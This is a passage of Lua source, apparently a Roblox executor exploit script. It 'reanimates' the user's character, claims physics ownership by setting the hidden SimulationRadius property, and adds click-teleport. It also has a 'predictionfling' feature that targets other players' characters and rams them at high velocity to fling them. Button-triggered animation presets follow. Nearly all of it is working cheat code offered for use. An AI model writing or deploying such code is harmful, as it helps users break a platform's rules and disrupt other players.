			end
			return nil
		end
		local function makejoint(p0, p1, p2)
			p1=getpart(p1)
			p2=getpart(p2)
			if not (p1 and p2) then return end
			for i,v in pairs(joints) do
				if (v.Part0==p1) and (v.Part1==p2) then
					joints[i]=nil
				elseif (v.Part0==p2) and (v.Part1==p1) then
					joints[i]=nil
				end
			end
			tinsert(joints,{
				Part0=p0,Part1=p1,
				C0=cf_0,
				C1=cframes[p1]:Inverse()*cframes[p0]
			})
		end
		makejoint(R6parts.head,"Head","UpperTorso")
		makejoint(R6parts.leftArm,"LeftUpperArm","UpperTorso")
		makejoint(R6parts.rightArm,"RightUpperArm","UpperTorso")
		makejoint(R6parts.leftLeg,"LeftUpperLeg","LowerTorso")
		makejoint(R6parts.rightLeg,"RightUpperLeg","LowerTorso")
		makejoint(R6parts.torso,"LowerTorso","HumanoidRootPart")
	end
		
	local function getPart(name,blacklist)
		for i,v in pairs(cframes) do
			if (i.Name==name) and not (blacklist and tfind(blacklist,i)) then
				return i
			end
		end
		return nil
	end

	local function getPartFromMesh(meshid,textureid,blacklist)
		for v,_ in pairs(cframes) do
			if (type(v)=="table") and not (blacklist and tfind(blacklist,v)) then
				if v.meshid and sfind(v.meshid,meshid) and sfind(v.textureid,textureid) then
					return v
				end
			end
		end
		return nil
	end

	local function getJoint(name)
		for i,v in pairs(joints) do
			if v.Name==name then
				return v
			end
		end
		return {C0=cf_0,C1=cf_0}
	end

	local function getPartJoint(handle)
		for i,v in pairs(joints) do
			if v.Part0==handle then
				return v
			end
		end
		for i,v in pairs(joints) do
			if v.Part1==handle then
				return v
			end
		end
		return nil
	end

	local accessorylimbs={	
		
		{meshid="11263221350",textureid="11263219250",C0=angles(1.5707963267948966,0,1.5707963267948966),Name="Left Arm"},
		{meshid="11159370334",textureid="11159284657",C0=angles(-1.5707963267948966,0,1.5707963267948966),Name="Right Arm"},
		{meshid="11159370334",textureid="11159285454",C0=angles(1.5707963267948966,0,1.5707963267948966),Name="Left Leg"},
		{meshid="12652772399",textureid="12652775021",C0=cf(0,-0.125,0),Name="Right Leg"},

		{meshid="14241018198",textureid="14251599953",C0=cf_0,Name="Torso"}
	}

	local alignblacklist={}
	for i=1,#accessorylimbs do
		local v=accessorylimbs[i]
		local p=getPart(v.Name)
		local h=getPartFromMesh(v.meshid,v.textureid,alignblacklist)
		local w=getPartJoint(h)
		if p and w then
			w.C0=v.C0
			w.Part0=h
			w.C1=cf_0
			w.Part1=p
			tinsert(alignblacklist,h)
		end
	end
		
	local raycastparams=RaycastParams.new()
	raycastparams.FilterType=e.RaycastFilterType.Blacklist
	raycastparams.RespectCanCollide=true
	local rayfilter={}
	local characters={}
	local function refreshrayfilter()
		tclear(rayfilter)
		for i,v in pairs(characters) do
			tinsert(rayfilter,v)
		end
		raycastparams.FilterDescendantsInstances=rayfilter
	end
	local flingtable={}
	local cframes1={}
	local lastpositions={}
	local rootparts={}
	local function ondes(v)
		twait()
		local meshid1,textureid1=getMeshOfPart(v)
		for i,v1 in pairs(cframes) do
			if type(i)=="table" and not dfind(cframes1,i) then 
				local meshid=i.meshid
				if meshid then
					if (meshid1==meshid) and (textureid1==i.textureid) then
						cframes1[v]=i
						lastpositions[v]=v.Position
						break
					end
				end
			end
		end
	end
	local function onplayer(v)
		local lastc=nil
		local function oncharacter()
			local newc=v.Character
			if newc and (newc ~= lastc) then
				lastc=newc
				characters[v]=newc
				refreshrayfilter()
				local hrp=timegp(newc,"HumanoidRootPart","BasePart",10)
				if not (hrp and c and newc:IsDescendantOf(ws)) then return end
				if v==lp then
					c=newc
					local startpos=pos+v3(mrandom(-32,32),0,mrandom(-32,32))
					local dir=nil
					local poscheck=true
					while poscheck do
						poscheck=false
						for i,v in pairs(rootparts) do
							local diff=(startpos-v.Position)*v3_101
							if diff.Magnitude<10 then
								poscheck=true
								dir=dir or diff.Unit
								startpos=startpos+dir
							end
						end
						local diff=(startpos-pos)*v3_101
						if diff.Magnitude<10 then
							poscheck=true
							dir=dir or diff.Unit
							startpos=startpos+dir
						end
					end
					startpos=cfr.Rotation+startpos
					local fi,fv=next(flingtable)
					if fi then
						for i,v in pairs(tclone(flingtable)) do
							if not c then
								return
							end
							local con=heartbeat:Connect(function()
								local idleoff=v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))
								
								hrp.CFrame=i.CFrame+i.Velocity*(sin(sine*15)+1)+v3_010*-2+idleoff*0.001
								hrp.Velocity=i.Velocity*75+idleoff
								hrp.RotVelocity=flingvel+idleoff
							end)
							twait(0.5)
							con:Disconnect()
							if v then
								v:Destroy()
							end
							flingtable[i]=nil
						end
					end
					local con=heartbeat:Connect(function()
						hrp.CFrame=startpos+v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))*0.005
						hrp.Velocity=v3_0
						hrp.RotVelocity=v3_0
					end)
					twait(0.26)
					con:Disconnect()
					newc:BreakJoints()
					tclear(cframes1)
					tclear(lastpositions)
					local cd=newc:GetDescendants()
					for i=1,#cd do
						tspawn(ondes,cd[i])
					end
					newc.DescendantAdded:Connect(ondes)
				else
					rootparts[v]=hrp
				end
			end
		end
		v:GetPropertyChangedSignal("Character"):Connect(oncharacter)
		oncharacter()
	end
	local plrst=plrs:GetPlayers()
	for i=1,#plrst do onplayer(plrst[i]) end
	plrs.PlayerAdded:Connect(onplayer)
	plrs.PlayerRemoving:Connect(function(v)
		characters[v]=nil
		rootparts[v]=nil
	end)
	
	local mradN05=rad(-0.5)
	local KeyCode=e.KeyCode
	local enumMLC=e.MouseBehavior.LockCenter
	local enumMB2=e.UserInputType.MouseButton2
	local enumMLCP=e.MouseBehavior.LockCurrentPosition
	local enumMD=e.MouseBehavior.Default
	local enumMW=e.UserInputType.MouseWheel

	local mode="default"
	local modes={default={}}
	local function addmode(key,mode)
		if (type(key)~="string") or (type(mode)~="table") then
			return
		end
		for i,v in pairs(mode) do
			if type(v)~="function" then
				mode[i]=nil
			end
		end
		if key=="default" then
			modes.default=mode
			if mode.modeEntered then
				mode.modeEntered()
			end
		elseif #key==1 then
			key=KeyCode[supper(ssub(key,1,1))]
			modes[key]=mode
		end
	end
	
	local keyW=KeyCode.W
	local Wpressed=uis:IsKeyDown(keyW)
	local keyA=KeyCode.A
	local Apressed=uis:IsKeyDown(keyA)
	local keyS=KeyCode.S
	local Spressed=uis:IsKeyDown(keyS)
	local keyD=KeyCode.D
	local Dpressed=uis:IsKeyDown(keyD)
	local keySpace=KeyCode.Space
	local spacePressed=uis:IsKeyDown(keySpace)
	
	local keyShift=KeyCode.LeftShift
	uis.InputBegan:Connect(function(a)
		if gs.MenuIsOpen or uis:GetFocusedTextBox() then
			return
		end
		a=a.KeyCode
		if a==keyW then
			Wpressed=true
		elseif a==keyA then
			Apressed=true
		elseif a==keyS then
			Spressed=true
		elseif a==keyD then
			Dpressed=true
		elseif a==keySpace then
			spacePressed=true
		elseif a==keyShift then
			shiftlock=allowshiftlock and not shiftlock
		elseif modes[a] then
			if modes[mode].modeLeft then
				modes[mode].modeLeft()
			end
			if mode==a then
				mode="default"
			else
				mode=a
			end
			if modes[mode].modeEntered then
				modes[mode].modeEntered()
			end
		end
	end)
	uis.InputEnded:Connect(function(a)
		a=a.KeyCode
		if a==keyW then
			Wpressed=false
		elseif a==keyA then
			Apressed=false
		elseif a==keyS then
			Spressed=false
		elseif a==keyD then
			Dpressed=false
		elseif a==keySpace then
			spacePressed=false
		end
	end)
	uis.InputChanged:Connect(function(a,b)
		if (not b) and (a.UserInputType==enumMW) then
			camoff=camoff+a.Position*v3_001*(0.75-camoff.Z/4)
			if camoff.Z>0 then
				camoff=camoff-camoff.Position
			end
			firstperson=camoff.Z==0
		end
	end)

	local function fling(target,duration,rotVelocity)
		if not c then
			return twait() and false
		end
		twait()
		return true --maybe later
	end

	local function predictionfling(target)
		if not c then
			return twait() and false
		end
		if typeof(target)~="Instance" then 
			target=mouse.Target
			if not target then
				return twait() and false
			end
		end
		if target:IsA("Humanoid") or target:IsA("BasePart") then 
			target=target.Parent 
			if target:IsA("Accessory") then
				target=target.Parent
			end
		end
		if (not target:IsA("Model")) or (target==c) then
			return twait() and false
		end
		local targetpart=gp(target,"HumanoidRootPart","BasePart") or gp(target,"Torso","BasePart") or gp(target,"UpperTorso","BasePart")
		if not (targetpart and targetpart:IsDescendantOf(ws)) then
			return twait() and false
		end
		if highlightflingtargets then
			local h=i("Highlight")
			h.Name=rs()
			h.Adornee=target
			h.FillColor=c3(1,0,0)
			h.OutlineColor=c3(1,0,0)
			h.FillTransparency=0.5
			h.OutlineTransparency=0
			h.Parent=i9
			flingtable[targetpart]=h
		else
			flingtable[targetpart]=false
		end
		twait()
		return true
	end

	if ctrlclicktp then
		ctrlclicktp=KeyCode.LeftControl
		local tpoff=v3_010*3
		if clickfling then
			mouse.Button1Down:Connect(function()
				if mouse.Target then
					if uis:IsKeyDown(ctrlclicktp) then
						pos=mouse.Hit.Position+tpoff
						cfr=cf(pos,pos+camoff.LookVector*v3_101)
						xzvel=v3_0
						Yvel=0
					else
						predictionfling()
					end
				end
			end)
		else
			mouse.Button1Down:Connect(function()
				if mouse.Target and uis:IsKeyDown(ctrlclicktp) then
					pos=mouse.Hit.Position+tpoff
					cfr=cf(pos,pos+camoff.LookVector*v3_101)
					xzvel=v3_0
					Yvel=0
				end
			end)
		end
	elseif clickfling then
		mouse.Button1Down:Connect(predictionfling)
	end

	local noYvelTime=1
	local lastsine=sine
	local pose=nil
	local con=nil
	local function mainFunction()
		if not c then 
			for i,v in pairs(cframes) do
				local p=i.placeholder
				if p then
					p:Destroy()
				end
			end
			for i,v in pairs(flingtable) do
				if v then
					v:Destroy()
				end
			end
			uis.MouseBehavior=enumMD
			onnewcamera()
			local c=lp.Character
			if c then
				cam.CameraSubject=c:FindFirstChildOfClass("Humanoid")
			end
			return con and con:Disconnect() 
		end

		sine=osclock()
		local delta=sine-lastsine
		deltaTime=clamp(delta*10,0,1)
		lastsine=sine

		if shiftlock then
			if allowshiftlock then
				uis.MouseBehavior=enumMLC
				local rotation=uis:GetMouseDelta()*mradN05
				local camoffpos=camoff.Position
				camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
			else
				shiftlock=false
			end
		elseif firstperson then
			uis.MouseBehavior=enumMLC
			local rotation=uis:GetMouseDelta()*mradN05
			local camoffpos=camoff.Position
			camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
		elseif uis:IsMouseButtonPressed(enumMB2) then
			uis.MouseBehavior=enumMLCP
			local rotation=uis:GetMouseDelta()*mradN05
			local camoffpos=camoff.Position
			camoff=cf(camoffpos,camoffpos+camoff.LookVector)*angles(rotation.Y,rotation.X,0)
		else
			uis.MouseBehavior=enumMD
		end

		local raycastresult=ws:Raycast(pos,v3_010*(fpdh-pos.Y),raycastparams)
		local onground=nil
		if raycastresult then
			raycastresult=raycastresult.Position
			onground=(pos.Y-raycastresult.Y)<3.01
			if onground then
				Yvel=0
				cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)*clamp(delta*20,0,1)
				if spacePressed then
					Yvel=jumpPower
				end
			else
				Yvel=Yvel-gravity*delta
				if pos.Y+Yvel*delta<raycastresult.Y then
					Yvel=0
					cfr=cfr+v3_010*(raycastresult.Y+3-pos.Y)
				end
			end
		else
			Yvel=0
			onground=false
		end
		xzvel=v3_0
		if Wpressed then
			xzvel=xzvel+(camoff.LookVector*v3_101).Unit
		end
		if Spressed then
			xzvel=xzvel-(camoff.LookVector*v3_101).Unit
		end
		if Apressed then
			xzvel=xzvel-(camoff.RightVector*v3_101).Unit
		end
		if Dpressed then
			xzvel=xzvel+(camoff.RightVector*v3_101).Unit
		end
		pos=cfr.Position
		if shiftlock or firstperson then
			if xzvel.Magnitude>0 then
				xzvel=xzvel.Unit*walkSpeed
			end
			cfr=cf(pos,pos+camoff.LookVector*v3_101)
		elseif xzvel.Magnitude>0 then
			xzvel=xzvel.Unit*walkSpeed
			cfr=cfr:Lerp(cf(pos,pos+xzvel),deltaTime)
		end
		cfr=cfr+(xzvel+(v3_010*Yvel))*delta
		pos=cfr.Position

		camcf=cf(pos,pos+camoff.LookVector)+camoff.LookVector*camoff.Z+v3_0150
		if shiftlock and not firstperson then
			camcf=camcf+camcf.RightVector*1.75
		end
		if cam then
			cam.CFrame=camcf
		end

		if onground then
			if xzvel==v3_0 then
				pose="idle"
			else
				pose="walk"
			end
		elseif Yvel>0 then
			pose="jump"
		else
			pose="fall"
		end
		local lerpfunc=modes[mode][pose]
		lerpfunc=lerpfunc or modes.default[pose]
		if lerpfunc then
			lerpfunc()
		end
		
		cframes[rootpart]=cfr
		refreshjoints(rootpart)

		if abs(Yvel)>1 then
			noYvelTime=0
		else
			noYvelTime=clamp(noYvelTime+delta*0.3,0,1)
			xzvel=xzvel*(1-noYvelTime)
		end

		local idlerv=v3(sin((sine-0.0375)*16),sin(sine*16),sin((sine+0.075)*16))
		local idleoff=idlerv*0.001
		
		for i,v in pairs(cframes) do
			local p=i.placeholder
			if p then
				if p.Parent~=ws then
					p.Parent=ws
				end
				p.CFrame=v
			end
		end
		for i,v in pairs(cframes1) do
			if (not i.Anchored) and i:IsDescendantOf(ws) then
				if i.ReceiveAge==0 then
					local p=v.placeholder
					if p and p.Parent then
						p.Parent=nil
					end
					v=cframes[v]
					local lastpos=lastpositions[i]
					local vel=(v.Position-lastpos)/delta
					if vel.Magnitude>speedlimit then
						vel=vel.Unit*speedlimit
						v=v+(lastpos+vel*delta)-v.Position
					end
					lastpositions[i]=v.Position
					if vel.Magnitude<0.15 then
						v=v+idleoff
					end
					if novoid and (v.Y<novoid) then
						v=v+v3_010*(novoid-v.Y)
					end
					i.Velocity=getNetlessVelocity(vel*noYvelTime+xzvel)
					i.CFrame=v
					i.RotVelocity=idlerv
				else
					lastpositions[i]=i.Position
				end
			end
		end

		if simrad then
			shp(lp,"SimulationRadius",simrad)
		end
	end

	con=heartbeat:Connect(mainFunction)
	mainFunction()
	
	stopreanimate=function()
		if c then
			c=nil
			return true
		else
			return false
		end
	end
	
	local legcfR=cf(1,-1,0)
	local legcfL=cf(-1,-1,0)
	local raydir=v3_010*-2
	local function raycastlegs() --this returns 2 values: right leg raycast offset, left leg raycast offset
		local rY=ws:Raycast((cfr*legcfR).Position,raydir,raycastparams)
		local lY=ws:Raycast((cfr*legcfL).Position,raydir,raycastparams)
		return rY and (rY.Position.Y-(pos.Y-3)) or 0,lY and (lY.Position.Y-(pos.Y-3)) or 0
	end

	local function velbycfrvec() --this returns 2 values: forward/backwards movement (from -1 to 1), right/left movement (from -1 to 1)
		local fw=cfr.LookVector*xzvel/walkSpeed
		local rt=cfr.RightVector*xzvel/walkSpeed
		return fw.X+fw.Z,rt.X+rt.Z
	end

	local lastvel=v3_0
	local velchg1=v3_0
	local function velchgbycfrvec() --this returns 2 values: forward/backwards velocity change, right/left velocity change
		velchg1=velchg1+(lastvel-xzvel) --i recommend setting velchg1 to v3_0 when u start using this function or it will look worse
		lastvel=xzvel
		velchg1=velchg1:Lerp(v3_0,deltaTime/2)
		local fw=cfr.LookVector*velchg1/32
		local rt=cfr.RightVector*velchg1/32
		return fw.X+fw.Z,rt.X+rt.Z
	end

	local function rotToMouse(alpha) --this rotates ur character towards your mouse hit position
		local mpos=mouse.Hit.Position
		cfr=cfr:Lerp(cf(pos,v3(mpos.X,pos.Y,mpos.Z)),alpha or deltaTime)
	end

	local function setWalkSpeed(n)
		if type(n) ~= "number" then
			n=16
		end
		walkSpeed=n
	end
	local function setJumpPower(n)
		if type(n) ~= "number" then
			n=50
		end
		jumpPower=n
	end
	local function setGravity(n)
		if type(n) ~= "number" then
			n=196.2
		end
		gravity=n
	end

	return {
		cframes=cframes,
		joints=joints,
		fling=fling,
		predictionfling=predictionfling,
		refreshjoints=refreshjoints,
		raycastlegs=raycastlegs,
		velbycfrvec=velbycfrvec,
		velchgbycfrvec=velchgbycfrvec,
		addmode=addmode,
		getPart=getPart,
		getPartFromMesh=getPartFromMesh,
		getJoint=getJoint,
		getPartJoint=getPartJoint,
		rotToMouse=rotToMouse,
		setWalkSpeed=setWalkSpeed,
		setJumpPower=setJumpPower,
		setGravity=setGravity
	}
end

btn("creepy crawler",function()
	local t=reanimate()
	if type(t)~="table" then return end
	local getJoint=t.getJoint
	local rootJoint=getJoint("RootJoint")
	local rightShoulder=getJoint("Right Shoulder")
	local leftShoulder=getJoint("Left Shoulder")
	local rightHip=getJoint("Right Hip")
	local leftHip=getJoint("Left Hip")
	local neck=getJoint("Neck")

	t.setWalkSpeed(10)

	local euler=angles
	local function jumplerp()
		local sine=sine*60
		neck.C0 = neck.C0:Lerp(cf(0,0,0.5) * euler(0,0,3.141592653589793),deltaTime) 
		rootJoint.C0 = rootJoint.C0:Lerp(cf(0,-1.4,0) * euler(3.141592653589793,0,-3.141592653589793),deltaTime) 
		leftShoulder.C0 = leftShoulder.C0:Lerp(cf(-1,1.5,0.3) * euler(1.7453292519943295,0,-0.17453292519943295),deltaTime) 
		rightShoulder.C0 = rightShoulder.C0:Lerp(cf(1,1.5,0.3) * euler(1.7453292519943295,0,0.17453292519943295),deltaTime) 
		leftHip.C0 = leftHip.C0:Lerp(cf(-1,-1.5,0.8) * euler(1.3962634015954636,0,-0.17453292519943295),deltaTime) 
		rightHip.C0 = rightHip.C0:Lerp(cf(1,-1.5,0.8) * euler(1.3962634015954636,0,0.17453292519943295),deltaTime)
	end

	t.addmode("default",{
		idle=function()
			local sine=sine*60
			neck.C0 = neck.C0:Lerp(cf(0,0,0.5) * euler(0.08726646259971647 * sin((sine + 20) * 0.05),0,3.141592653589793 + 0.3490658503988659 * sin((sine + -30) * 0.025)),deltaTime) 
			rootJoint.C0 = rootJoint.C0:Lerp(cf(0,-1.5 + 0.1 * sin(sine * 0.05),0) * euler(3.141592653589793,0,-3.1590459461097367 + 0.05235987755982989 * sin(sine * 0.025)),deltaTime) 
			leftShoulder.C0 = leftShoulder.C0:Lerp(cf(-1,1.5,-0.1 * sin(sine * 0.05)) * euler(1.5707963267948966,0,0.08726646259971647 * sin(sine * 0.025)),deltaTime) 
			rightShoulder.C0 = rightShoulder.C0:Lerp(cf(1,1.5,-0.1 * sin(sine * 0.05)) * euler(1.5707963267948966,0,0.08726646259971647 * sin(sine * 0.025)),deltaTime) 
			leftHip.C0 = leftHip.C0:Lerp(cf(-1,-1.5,0.5 + -0.1 * sin((sine + 10) * 0.05)) * euler(1.5707963267948966,0,0.08726646259971647 * sin(sine * 0.025)),deltaTime) 
			rightHip.C0 = rightHip.C0:Lerp(cf(1,-1.5,0.5 + -0.1 * sin((sine + 10) * 0.05)) * euler(1.5707963267948966,0,0.08726646259971647 * sin(sine * 0.025)),deltaTime) 
		end,
		walk=function()
			local sine=sine*60
			neck.C0 = neck.C0:Lerp(cf(0,0,0.5) * euler(0.17453292519943295,0.03490658503988659 * sin((sine + 2.5) * 0.2),3.141592653589793 + -0.17453292519943295 * sin((sine + -10) * 0.2)),deltaTime) 
			rootJoint.C0 = rootJoint.C0:Lerp(cf(0,-1.5,0) * euler(3.0543261909900767,0.08726646259971647 * sin((sine + 7.5) * 0.2),-3.1590459461097367 + -0.08726646259971647 * sin(sine * 0.2)),deltaTime) 
			leftShoulder.C0 = leftShoulder.C0:Lerp(cf(-1,1.5 + 0.5 * sin((sine + 10) * 0.2),0.3 + 0.2 * sin((sine + -10) * 0.2)) * euler(1.6580627893946132 + 0.17453292519943295 * sin((sine + 15) * 0.2),0,-0.08726646259971647 * sin(sine * 0.2)),deltaTime) 
			rightShoulder.C0 = rightShoulder.C0:Lerp(cf(1,1.5 + 0.5 * sin((sine + -7.5) * 0.2),0.3 + 0.2 * sin((sine + 5) * 0.2)) * euler(1.6580627893946132 + 0.17453292519943295 * sin(sine * 0.2),0,-0.08726646259971647 * sin(sine * 0.2)),deltaTime) 
			leftHip.C0 = leftHip.C0:Lerp(cf(-1,-1.5 + 0.5 * sin((sine + -7.5) * 0.2),0.5 + 0.2 * sin((sine + 5) * 0.2)) * euler(1.6580627893946132 + 0.17453292519943295 * sin(sine * 0.2),0,-0.08726646259971647 * sin(sine * 0.2)),deltaTime) 
			rightHip.C0 = rightHip.C0:Lerp(cf(1 -1.5 + 0.5 * sin((sine + 10) * 0.2),0.5 + 0.2 * sin((sine + -7.5) * 0.2)) * euler(1.6580627893946132 + -0.17453292519943295 * sin(sine * 0.2),0,-0.08726646259971647 * sin(sine * 0.2)),deltaTime) 
		end,
		jump=jumplerp,
		fall=jumplerp
	})
end)

btn("nameless animations V7", function()
	local t=reanimate()
	if type(t)~="table" then return end
	local raycastlegs=t.raycastlegs
	local velbycfrvec=t.velbycfrvec
	local velchgbycfrvec=t.velchgbycfrvec
	local addmode=t.addmode
	local getJoint=t.getJoint
	local RootJoint=getJoint("RootJoint")
	local RightShoulder=getJoint("Right Shoulder")
	local LeftShoulder=getJoint("Left Shoulder")
	local RightHip=getJoint("Right Hip")
	local LeftHip=getJoint("Left Hip")
	local Neck=getJoint("Neck")

	addmode("default", {
		idle = function()
			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.3 + 0.1 * sin(sine * 2), -0.1) * angles(-0.5235987755982988 + 0.05235987755982989 * sin((sine + 1.5) * 2), 1.0471975511965976 + 0.08726646259971647 * sin((sine + 0.5) * 2), 0.5235987755982988), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.6580627893946132 + 0.08726646259971647 * sin((sine + 0.6) * 2), 0, 3.141592653589793 + 0.2617993877991494 * sin((sine - 1.2) * 1)), deltaTime)
			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0.1 * sin(sine * 2), Cfw * -3) * angles(-1.5707963267948966 + 0.08726646259971647 * sin(sine * 2) - Cfw, Crt, 3.141592653589793), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1 - 0.1 * sin(sine * 2) + rY, 0.1 * sin(sine * 2) - rY * 0.5) * angles(-0.6981317007977318 - 0.08726646259971647 * sin(sine * 2), 1.0471975511965976, 0.5235987755982988), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.6 + 0.1 * sin(sine * 2), 0) * angles(3.141592653589793 + 0.05235987755982989 * sin((sine + 0.5) * 2), -2.705260340591211 + 0.017453292519943295 * sin((sine + 1.5) * 2), -1.2217304763960306 + 0.05235987755982989 * sin((sine + 1.5) * 2)), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1 - 0.1 * sin(sine * 2) + lY, 0.1 * sin(sine * 2) - lY * 0.5) * angles(-0.3490658503988659 - 0.08726646259971647 * sin(sine * 2), -1.0471975511965976, -0.5235987755982988), deltaTime)
			--RightArm,1,0,0,2,-30,3,1.5,2,0.3,0.1,0,2,60,5,0.5,2,-0.1,0,0,2,30,0,0,2,Head,0,0,0,2,-95,5,0.6,2,1,0,0,2,-0,0,0,1,0,0,0,2,180,15,-1.2,1,Torso,0,0,0,2,-90,5,0,2,0,0.1,0,2,-0,0,0,2,0,0,0,2,180,0,0,2,RightLeg,1,0,0,2,-40,-5,0,2,-1,-0.1,0,2,60,0,0,2,0,0.1,0,2,30,0,0,2,Meshes/TrollFaceHeadAccessory_Handle,0.01043701171875,0,0,1,0,0,0,1,0.43610429763793945,0,0,1,0,0,0,1,-0.01102447509765625,0,0,1,0,0,0,1,LeftArm,-1,0,0,2,180,3,0.5,2,0.6,0.1,0,2,-155,1,1.5,2,0,0,0,2,-70,3,1.5,2,LeftLeg,-1,0,0,2,-20,-5,0,2,-1,-0.1,0,2,-60,0,0,2,0,0.1,0,2,-30,0,0,2
		end,
		walk = function()
			local Vfw, Vrt = velbycfrvec()

			local rY, lY = raycastlegs()

			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, -0.2 + 0.2 * sin(sine * 16), Cfw * -3) * angles(-1.6580627893946132 + 0.04363323129985824 * sin(sine * 16) - Vfw * 0.15 - Cfw, 0.03490658503988659 * sin(sine * 8) + Vrt * 0.15 + Crt, -3.141592653589793 - 0.08726646259971647 * sin((sine + 0.25) * 8) - Vrt * 0.1), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -0.8 + 0.4 * sin((sine + 0.125) * 8) + rY, -0.15 * Vfw + 0.4 * sin((sine + 10) * 8) * Vfw + rY * -0.5) * angles(1.3962634015954636 + 0.6981317007977318 * sin(sine * 8)*Vfw, 1.5707963267948966 + 0.6981317007977318 * sin(sine * 8)*Vrt, -1.5707963267948966 + 0.2617993877991494 * sin(sine * 8)), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.35 - 0.1 * sin(sine * 8), 0) * angles(0.5235987755982988 * sin(sine * 8)*Vfw, -1.5707963267948966 - 0.5235987755982988 * sin(sine * 8)*Vfw, -0.5235987755982988 * sin(sine * 8)*Vfw), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.35 + 0.1 * sin(sine * 8), 0) * angles(-0.5235987755982988 * sin(sine * 8)*Vfw, 1.5707963267948966 - 0.5235987755982988 * sin(sine * 8)*Vfw, -0.5235987755982988 * sin(sine * 8)*Vfw), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -0.8 - 0.4 * sin((sine + 0.125) * 8) + lY, -0.15 * Vfw - 0.4 * sin((sine + 10) * 8) * Vfw + lY * -0.5) * angles(1.3962634015954636 - 0.6981317007977318 * sin(sine * 8)*Vfw, -1.5707963267948966 - 0.6981317007977318 * sin(sine * 8)*Vrt, 1.5707963267948966 + 0.2617993877991494 * sin(sine * 8)), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.5707963267948966 + 0.08726646259971647 * sin((sine + 10) * 16) + Vfw * 0.15, -0.08726646259971647 * sin(sine * 8) + Vrt * -0.1, 3.141592653589793 - 0.05235987755982989 * sin((sine + 5) * 8) - Vrt * 0.5), deltaTime)
			--Torso,0,0,0,8,-95,2.5,0,16,-0.2,0.2,0,16,0,5,0,8,0,0,0,8,-180,-5,0.25,8,RightArm,1,0,0,1,0,-30,0,8,0.35,0.1,0,8,90,-30,0,8,0,0,0,8,0,-30,0,8,RightLeg,1,0,0,8,80,40,0,8,-0.8,0.4,0.125,8,90,40,0,8,-0.15,0.4,10,8,-90,15,0,8,LeftLeg,-1,0,0,8,80,-40,0,8,-0.8,-0.4,0.125,8,-90,-40,0,8,-0.15,-0.4,10,8,90,15,0,8,Head,0,0,0,1,-90,2.5,10,16,1,0,0,1,-0,-5,0,8,0,0,0,1,180,-3,5,8,LeftArm,-1,0,0,1,0,30,0,8,0.35,-0.1,0,8,-90,-30,0,8,0,-0.4,0,8,0,-30,0,8
		end,
		jump = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.4835298641951802 + Vfw * 0.1 - Cfw, Vrt * -0.05 + Crt, -3.141592653589793), deltaTime)
			RightShoulder.C0 = RightShoulder.C0:Lerp(cf(1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.7453292519943295 + 0.08726646259971647 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			LeftHip.C0 = LeftHip.C0:Lerp(cf(-1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.6580627893946132 + 0.06981317007977318 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			LeftShoulder.C0 = LeftShoulder.C0:Lerp(cf(-1, 0.5, 0) * angles(4.014257279586958 - 0.08726646259971647 * sin((sine + 0.5) * 4), -1.7453292519943295 - 0.08726646259971647 * sin((sine + 0.25) * 4), 1.5707963267948966), deltaTime)
			Neck.C0 = Neck.C0:Lerp(cf(0, 1, 0) * angles(-1.3962634015954636, 0, -3.141592653589793 - Vrt), deltaTime)
			RightHip.C0 = RightHip.C0:Lerp(cf(1, -1, 0) * angles(1.5707963267948966 - 0.08726646259971647 * sin((sine + 0.5) * 4), 1.6580627893946132 - 0.06981317007977318 * sin((sine + 0.25) * 4), -1.5707963267948966), deltaTime)
			--Torso,0,0,0,4,-85,0,0,4,0,0,0,4,0,0,0,4,0,0,0,4,-180,0,0,4,RightArm,1,0,0,4,230,-5,0.5,4,0.5,0,0,4,100,5,0.25,4,0,0,0,4,-90,0,0,4,LeftLeg,-1,0,0,4,90,-5,0.5,4,-1,0,0,4,-95,4,0.25,4,0,0,0,4,90,0,0,4,LeftArm,-1,0,0,4,230,-5,0.5,4,0.5,0,0,4,-100,-5,0.25,4,0,0,0,4,90,0,0,4,Head,0,0,0,4,-80,0,0.5,4,1,0,0,4,0,0,0.25,4,0,0,0,4,-180,0,0,4,RightLeg,1,0,0,4,90,-5,0.5,4,-1,0,0,4,95,-4,0.25,4,0,0,0,4,-90,0,0,4
		end,
		fall = function()
			local Vfw, Vrt = velbycfrvec()

			local Cfw, Crt = velchgbycfrvec()

			RootJoint.C0 = RootJoint.C0:Lerp(cf(Crt * 3, 0, Cfw * -3) * angles(-1.6580627893946132 + Vfw * 0.1 - Cfw, Vrt * -0.05 + Crt, -3.141592653589793), deltaTime)
